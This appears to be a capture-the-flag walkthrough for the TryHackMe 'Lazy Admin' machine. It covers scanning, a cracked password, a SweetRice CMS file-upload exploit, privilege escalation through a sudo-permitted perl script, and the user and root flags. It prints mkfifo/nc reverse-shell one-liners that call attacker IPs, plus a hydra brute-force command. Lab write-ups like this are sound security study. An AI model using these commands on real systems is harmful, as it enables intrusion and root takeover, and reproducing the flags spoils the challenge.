# Lazy Admin

## Notes

```
Easy linux machine to practice skills
export IP=10.10.82.86

Nmap Results:
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
1187/tcp  filtered alias
50002/tcp filtered iiimsf

Dirsearch: (using default wordlist)
[18:32:41] 301 -  312B  - /content  ->  http://10.10.82.86/content/
    [18:38:37] 200 -   18KB - /content/changelog.txt
    [18:39:16] 301 -  319B  - /content/images  ->  http://10.10.82.86/content/images/
    [18:39:17] 301 -  316B  - /content/inc  ->  http://10.10.82.86/content/inc/
    [18:39:17] 200 -    7KB - /content/inc/
    [18:39:18] 200 -    2KB - /content/index.php
    [18:39:19] 200 -    2KB - /content/index.php/login/
    [18:39:27] 200 -   15KB - /content/license.txt
    [19:01:43] 301 -  315B  - /content/js  ->  http://10.10.82.86/content/js/
    [19:02:57] 301 -  315B  - /content/as  ->  http://10.10.82.86/content/as/
    [19:03:06] 301 -  320B  - /content/_themes  ->  http://10.10.82.86/content/_themes/
    [19:03:12] 301 -  323B  - /content/attachment  ->  http://10.10.82.86/content/attachment/
[18:33:12] 200 -   11KB - /index.html
[18:34:18] 403 -  276B  - /server-status
[18:34:18] 403 -  276B  - /server-status/

Findings:
mysql backup has a md5 hash value which translates to Password123
/content/as => gives login page
Credential => manager:Password123 can be found in mysql backup file

Exploit on SweetRice CMS:
Reference: https://www.exploit-db.com/exploits/40716
Arbitary file upload, upload revershell
Change file extension to .phtml

After shell:
There is mysql creds lying around   => might be useful. didn't explore much
Search gtfobin for all available setuid binaries, found we can work with mount
Using gtfo might not be the way coz it is giving some error => sudo: no tty present and no askpass program specified

sudo -l seems interesting
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

perl and backup.pl can be run as sudo

looking at backup.pl file
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
it seems the script is executing /etc/copy.sh

ls -l /tmp/f
prw-rw-rw- 1 www-data www-data    0 Jun 16 16:56 f
permission starts with p?
Is a pipe file type. FIFO works as input and output

/etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

Dummy test
mkfifo ./f;cat ./f|/bin/sh -i 2>&1|nc 10.9.18.129 1234 >./f
indeed this creates a revershell with current user

we need to run this file as sudo and replace nc ip/port with our listening ip/port
replace content of /etc/copy.sh with following:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.18.129 1234 >/tmp/f
sudo /usr/bin/perl /home/itguy/backup.pl => will give you shell as root
YOU ARE NOW ROOT

Bruteforce ssh password:
hydra -l user -P /media/nikesh/HDD/Security/wordlist/rockyou.txt 10.10.82.86 -t 4 ssh   => Was not effective
```

## Questions

1. What is the user flag?

```
After shell the first flag is inside /home/itguy/user.txt

THM{63e5bce9271952aad1113b6f1ac28a07}

```

2. What is the root flag?

```
After becoming root the flag is inside /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```
